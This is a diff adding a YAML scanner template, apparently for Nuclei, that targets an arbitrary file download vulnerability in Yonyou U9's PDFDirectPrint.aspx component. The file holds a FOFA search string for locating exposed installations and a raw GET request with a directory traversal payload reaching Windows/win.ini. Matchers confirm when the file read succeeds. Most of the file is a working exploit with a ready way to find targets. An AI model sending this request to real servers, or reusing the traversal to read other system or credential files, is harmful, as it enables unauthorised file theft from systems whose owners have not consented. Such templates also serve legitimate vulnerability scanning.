@@ -1,0 +1,31 @@
+id: yonyou-u9-pdfdirectprint-file-download
+
+info:
+  name: 用友U9多组织企业互联网应用平台 PDFDirectPrint.aspx 组件任意文件下载漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="logo-u9.png"
+      通过分析GET请求参数filePath、fileMappingName、isDeleteOrgFile及isAttachmentFlag的处理流程，发现内部调用路径指向Print/DynamaticExport.aspx?FilePath=。由于DownLoadFileToStream方法未实施有效路径过滤机制，攻击者可构造恶意请求实现任意文件下载
+  tags: 用友U9多组织企业互联网应用平台
+
+http:
+- raw:
+  - |
+    GET /Print/PDFDirectPrint.aspx?FilePath=../../../../../../../../Windows/win.ini HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'DynamaticExport.aspx'
+  - type: word
+    part: body
+    words:
+    - 'win.ini'
